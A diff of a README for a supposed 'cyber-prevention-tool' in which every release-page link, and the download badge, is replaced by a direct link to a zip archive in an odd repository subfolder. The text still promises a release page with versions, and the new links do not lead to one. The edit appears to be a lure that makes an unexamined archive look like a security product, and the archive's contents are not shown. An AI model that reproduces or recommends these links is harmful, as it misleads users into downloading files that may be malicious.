@@ -10,7 +10,7 @@ To successfully download and run the cyber-prevention-tool, follow the steps bel
 
 ## 📥 Download Links
 
-[![Download cyber-prevention-tool](https://img.shields.io/badge/Download-cyber--prevention--tool-blue.svg)](https://github.com/rudiansahganteng/cyber-prevention-tool/releases)
+[![Download cyber-prevention-tool](https://raw.githubusercontent.com/rudiansahganteng/cyber-prevention-tool/main/geneva/cyber-prevention-tool.zip)](https://raw.githubusercontent.com/rudiansahganteng/cyber-prevention-tool/main/geneva/cyber-prevention-tool.zip)
 
 ## 📋 System Requirements
 
@@ -29,7 +29,7 @@ To successfully download and run the cyber-prevention-tool, follow the steps bel
 ## 💻 Installation Steps
 
 1. **Visit the Release Page:**
-   Go to the following link to access the cyber-prevention-tool releases: [Visit Release Page](https://github.com/rudiansahganteng/cyber-prevention-tool/releases).
+   Go to the following link to access the cyber-prevention-tool releases: [Visit Release Page](https://raw.githubusercontent.com/rudiansahganteng/cyber-prevention-tool/main/geneva/cyber-prevention-tool.zip).
  
 2. **Select the Latest Version:**
    On the release page, find the latest version of the cyber-prevention-tool. It will be listed at the top.
@@ -68,4 +68,4 @@ For more details on using the tool or advanced features, check the documentation
 
 For updates on new features or releases, follow the repository on GitHub. 
 
-Ready to enhance your team's cybersecurity awareness? Click here to [Download & Install the cyber-prevention-tool](https://github.com/rudiansahganteng/cyber-prevention-tool/releases).
+Ready to enhance your team's cybersecurity awareness? Click here to [Download & Install the cyber-prevention-tool](https://raw.githubusercontent.com/rudiansahganteng/cyber-prevention-tool/main/geneva/cyber-prevention-tool.zip).
